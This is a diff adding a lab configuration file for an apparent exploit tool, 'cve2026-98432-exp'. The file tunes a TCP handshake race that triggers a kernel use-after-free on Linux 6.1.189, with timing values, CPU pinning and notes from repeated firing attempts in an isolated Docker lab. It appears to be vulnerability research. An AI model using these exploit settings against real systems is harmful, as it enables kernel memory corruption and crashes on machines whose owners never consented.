@@ -1,0 +1,52 @@
+# Lab attack configuration for cve2026-98432-exp v0.3.0 — fire #2
+# mode "handshake": the full 2-CPU race (retransmit reader vs
+# child-create/kfree). Runs ONLY in our isolated lab (Proxmox VM
+# debian12-lab, KASAN 6.1.189). See the tool's DISCLAIMER.
+#
+# Topology: docker default bridge.
+#   listener container = 172.17.0.2  -> /tmp/exp --listen 9000
+#   sender   container = 172.17.0.3  -> /tmp/exp --cli --config /lab/attack-hs.toml
+# The target side MUST be the Go listener (accept+hold), not busybox
+# nc: the child must stay open until OUR RST closes it in-kernel.
+
+[general]
+lang = "en"
+dry_run = false
+cli = false           # headless via `--cli` on the command line
+
+[target]
+ip = "172.17.0.2"      # listener container IP (check: docker inspect)
+port = 9000
+kernel_version = "6.1.189"
+mode = "handshake"
+
+[payload]
+options_preset = "ts"      # nop | ts | rr | ssrr | custom
+custom_options_hex = ""
+ttl = 64
+window = 65535
+tcp_common_options = true
+source_ip = ""             # auto = sender egress (172.17.0.3)
+df_only = true
+
+[timing]
+delta_us = 150       # (unused by handshake rounds, kept valid)
+flows = 1            # handshake mode: one 4-tuple at a time
+flow_gap_ms = 0      # no pause between rounds (rounds ~4 ms: RTT + observe window)
+duration_sec = 120   # overridden by --duration in lab-fire.sh
+
+[handshake]
+# PARALLEL dispatch from t=0 (SYN-ACK arrival): the completing ACK
+# (cpu_ack) at t=0, the retransmit (cpu_rtx) at t=delta, the closing
+# RST (coordinator, a third CPU) at t=delta+rst_gap. Wire order:
+# ACK -> retransmit -> RST (fire #4: fire #3's serialized dispatch
+# put the retransmit ~420us AFTER the RST -> child already closed).
+delta_ack_us = 18          # completing ACK (t=0) -> retransmitted SYN, microseconds
+rst_gap_us = 0             # retransmit -> closing RST, microseconds (0 = RST at t=delta, natural order race)
+cpu_rtx = 1                # vCPU of the retransmit thread (the vulnerable reader)
+cpu_ack = 2                # vCPU of the completing-ACK thread (child create); the RST goes out from the coordinator
+synack_timeout_ms = 5      # skip the round if no real SYN-ACK in 5 ms
+observe_us = 700           # post-dispatch observation window (lab tuning: 3 ms rate-limited the
+                           # round rate ~5x; the KASAN hit is kernel-side, pcap evidence comes
+                           # from the docker0 tcpdump, not this tap; first response ends early)
+delta_sweep_us = [70, 80, 90, 100, 110, 120]  # fire #11: aim READER at the kernel-teardown kfree window (F1ker S+63..84us)
